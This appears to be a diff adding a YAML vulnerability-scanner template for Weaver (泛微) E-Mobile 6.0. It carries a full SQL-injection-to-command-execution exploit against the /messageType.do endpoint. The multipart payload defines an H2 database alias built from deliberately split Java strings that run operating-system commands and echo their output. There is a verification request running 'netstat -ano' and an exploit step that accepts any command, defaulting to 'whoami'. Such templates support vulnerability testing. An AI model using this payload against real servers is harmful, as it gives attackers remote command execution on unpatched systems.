@@ -1,0 +1,58 @@
+app: Ecology
+query: app:"Ecology"
+meta:
+    name: 泛微E-Mobile 命令执行漏洞
+    level: 4
+    tags:
+        - remote_code_execution
+        - sql_injection
+    description: 泛微E-Mobile 6.0被爆存在漏洞命令执行。现已确认该漏洞可被攻击者利用，攻击者可通 过在输入中添加特殊字符或命令来序列欺骗应用程序将其作为有效命令去执行，从而获取服 务器的执行权限。
+    homepage: https://www.weaver.com.cn/
+    author: Administrator
+    references: https://zhuanlan.zhihu.com/p/646128046
+    solution: 安装升级补丁
+    create_at: "2023-10-19 18:49:41"
+    available: true
+    steps:
+        variable: []
+        verify_steps:
+            type: and
+            verify:
+                - request:
+                    method: POST
+                    path: /messageType.do
+                    redirect: true
+                    header:
+                        - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
+                    params: "------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\ncreate\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name=\"typeName\"\r\n\r\n1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagm('netstat -ano');--\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7--"
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
+                    - name: body
+                      value: '0.0.0.0:0'
+                      type: contains
+                    - name: body
+                      value: 'PID'
+                      type: contains
+                    - name: body
+                      value: 'TCP'
+                      type: contains
+        exploit_steps:
+            type: and
+            params:
+                name: CMD
+                type: input
+                value: whoami
+            exploit:
+                - request:
+                    method: POST
+                    path: /messageType.do
+                    redirect: true
+                    header:
+                        - Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7
+                    params: "------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\ncreate\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7\r\nContent-Disposition: form-data; name=\"typeName\"\r\n\r\n1';CREATE ALIAS if not exists MzSNqKsZTagm AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass(\"com.caucho.server.dispatch.ServletInvocation\").getMet','hod(\"getContextRequest\").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField(\"_response\");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod(\"getWriter\");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter(\"\\A\");writer.write(scan','ner.hasNext()?sca','nner.next():\"\");}');CALL MzSNqKsZTagm('{{exploit}}');--\r\n------WebKitFormBoundaryTm8YXcJeyKDClbU7--"
+                  response:
+                    - name: code
+                      value: "200"
+                      type: equals
